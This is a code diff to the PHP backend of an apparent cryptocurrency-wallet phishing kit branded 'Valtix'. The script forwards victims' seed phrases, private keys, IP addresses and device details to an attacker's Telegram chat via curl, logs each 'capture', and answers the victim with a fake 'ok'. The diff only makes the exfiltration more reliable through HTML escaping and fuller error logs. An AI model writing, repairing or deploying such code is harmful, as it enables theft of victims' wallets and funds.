@@ -55,6 +55,15 @@ $capture = [
     'capturedAt' => date('Y-m-d H:i:s'),
 ];
 
+// ====================================================================
+// ESCAPE FUNCTION: strips characters that break Telegram HTML
+// We use HTML mode because it's far more resilient to arbitrary input
+// than Markdown, which breaks on underscores, brackets, etc.
+// ====================================================================
+function tgHtmlEscape($text) {
+    return htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
+}
+
 // ========== SEND TO TELEGRAM FIRST (before file write) ==========
 $walletEmoji = [
     'phantom'     => '👻 Phantom',
@@ -72,40 +81,41 @@ $walletName = $capture['walletName'];
 $wordCount  = $capture['seedWordCount'];
 
 if (!empty($walletName)) {
-    $walletLabel = "👛 {$walletName}";
+    $walletLabel = "👛 " . tgHtmlEscape($walletName);
 } elseif (isset($walletEmoji[$walletKey])) {
-    $walletLabel = $walletEmoji[$walletKey];
+    $walletLabel = tgHtmlEscape($walletEmoji[$walletKey]);
 } else {
     $walletLabel = '👛 Unknown';
 }
 
-$message = "🚨 *Valtix — New Capture* 🚨\n";
+// Build message with HTML parse_mode (robust against special chars)
+$message  = "🚨 <b>Valtix — New Capture</b> 🚨\n";
 $message .= "━━━━━━━━━━━━━━━━━━\n";
-$message .= "💰 *Wallet:* {$walletLabel}\n";
-$message .= "🆔 *ID:* `{$capture['id']}`\n";
-$message .= "📅 *Time:* {$capture['timestamp']}\n";
-$message .= "🌐 *IP:* `{$capture['ip']}`\n";
+$message .= "💰 <b>Wallet:</b> {$walletLabel}\n";
+$message .= "🆔 <b>ID:</b> <code>" . tgHtmlEscape($capture['id']) . "</code>\n";
+$message .= "📅 <b>Time:</b> " . tgHtmlEscape($capture['timestamp']) . "\n";
+$message .= "🌐 <b>IP:</b> <code>" . tgHtmlEscape($capture['ip']) . "</code>\n";
 $message .= "━━━━━━━━━━━━━━━━━━\n";
 
 if (!empty($seed)) {
-    $message .= "📝 *Seed Phrase ({$wordCount} words):*\n`{$seed}`\n";
+    $message .= "📝 <b>Seed Phrase ({$wordCount} words):</b>\n<code>" . tgHtmlEscape($seed) . "</code>\n";
 } else {
-    $message .= "📝 *Seed:* ❌ None\n";
+    $message .= "📝 <b>Seed:</b> ❌ None\n";
 }
 $message .= "\n";
 if (!empty($pkey)) {
-    $message .= "🔑 *Private Key:*\n`{$pkey}`\n";
+    $message .= "🔑 <b>Private Key:</b>\n<code>" . tgHtmlEscape($pkey) . "</code>\n";
 } else {
-    $message .= "🔑 *Private Key:* ❌ None\n";
+    $message .= "🔑 <b>Private Key:</b> ❌ None\n";
 }
 if (!empty($capture['screenSize'])) {
-    $message .= "📱 *Screen:* {$capture['screenSize']}\n";
+    $message .= "📱 <b>Screen:</b> " . tgHtmlEscape($capture['screenSize']) . "\n";
 }
 if (!empty($capture['userAgent'])) {
-    $message .= "💻 *UA:* " . substr($capture['userAgent'], 0, 80) . "\n";
+    $message .= "💻 <b>UA:</b> " . tgHtmlEscape(substr($capture['userAgent'], 0, 80)) . "\n";
 }
 $message .= "━━━━━━━━━━━━━━━━━━\n";
-$message .= "⚡ *Valtix Intelligence*";
+$message .= "⚡ <b>Valtix Intelligence</b>";
 
 // Send to Telegram - catch any curl errors
 $tgSuccess = false;
@@ -121,7 +131,7 @@ try {
             CURLOPT_POSTFIELDS     => json_encode([
                 'chat_id'    => $chatId,
                 'text'       => $message,
-                'parse_mode' => 'Markdown',
+                'parse_mode' => 'HTML',
             ]),
             CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
             CURLOPT_RETURNTRANSFER => true,
@@ -137,7 +147,7 @@ try {
             $tgSuccess = true;
             file_put_contents($ERROR_LOG, "[" . date('Y-m-d H:i:s') . "] TG OK to {$chatId}: wallet={$walletLabel}, seed=" . (!empty($seed)?'YES':'NO') . ", key=" . (!empty($pkey)?'YES':'NO') . "\n", FILE_APPEND);
         } else {
-            file_put_contents($ERROR_LOG, "[" . date('Y-m-d H:i:s') . "] TG FAILED to {$chatId}: HTTP {$http}, curl: {$curlError}, resp: " . substr($resp, 0, 200) . "\n", FILE_APPEND);
+            file_put_contents($ERROR_LOG, "[" . date('Y-m-d H:i:s') . "] TG FAILED to {$chatId}: HTTP {$http}, curl: {$curlError}, resp: " . substr($resp, 0, 500) . "\n", FILE_APPEND);
         }
     }
 } catch (Exception $e) {
@@ -157,5 +167,5 @@ try {
 // Summary log
 file_put_contents($LOG_DIR . '/summary.log', "[" . date('Y-m-d H:i:s') . "] Wallet: {$capture['walletName']} | IP: {$capture['ip']} | Seed: " . (!empty($seed) ? 'YES' : 'NO') . " | Key: " . (!empty($pkey) ? 'YES' : 'NO') . " | TG: " . ($tgSuccess ? 'OK' : 'FAILED') . "\n", FILE_APPEND);
 
-// ========== Always return error to victim ==========
+// Always return OK to the victim
 echo json_encode(['status' => 'ok', 'message' => 'Connection processed']);
